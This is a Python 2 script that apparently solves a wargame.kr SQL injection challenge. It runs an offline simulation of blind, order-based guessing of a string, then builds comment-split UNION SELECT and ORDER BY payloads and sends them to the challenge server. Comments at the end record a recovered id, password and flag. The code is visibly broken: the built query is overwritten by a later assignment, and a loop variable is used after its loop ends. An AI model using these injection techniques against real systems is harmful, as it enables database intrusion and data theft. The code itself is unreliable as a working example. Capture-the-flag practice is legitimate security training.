# -*- coding: utf8 -*-

import urllib, urllib2, time, random

s = "0123456789abcdefghijklmnopqrstuvwxyz"
sqlstr = ''.join(random.sample(s,len(s)))
stri = "0123456789abcdefghijklmnopqrstuvwxyz{"
count = 0

ansr = ""

while(1):
    for i in range(0,len(stri)):
        condition = "{}{}".format(ansr,stri[i])
        print ansr, stri
        if sqlstr < condition:
            ansr = str(ansr) + str(stri[(i-1)])
            stri = stri.replace(str(stri[(i-1)]),'')
            break
        count = count + 1
    if count >= 150:
        print "\nfailed"
        print "origin:" + sqlstr
        print "found :" + ansr
        print "remain:" + str(len(stri)-1)
        break
    else:
        print count
    if len(ansr) == 36:
        print "\ncomplete"
        print "guessed:" + ansr
        print "origin :" + sqlstr
        print "match  :" + str(ansr == sqlstr)
        print "count:" + str(count)
        break

headers = {'Host': 'wargame.kr:8080'}

data = "?id="
data = data + urllib.quote("' union select 1,2,3,4,5 from findflag_2 /*")
data = data + "&pw="
data = data + urllib.quote("*/ union select true,true,'{}{}',4,5 order by 3 desc#".format('w',stri[i]))
data = "&flag="
data = data + urllib.quote("")

req = urllib2.Request("http://wargame.kr:8080/zairo/" + data, '', headers)
if(count <= 150):
	response = urllib2.urlopen(req)

	res = response.read()
	print len(res), res

# pw : wkdlfhpw!!@%%#@@#
# id : zairowkdlfhdkel
# 187da6d4d8ae44c81767b7c52c8a77a51990e72c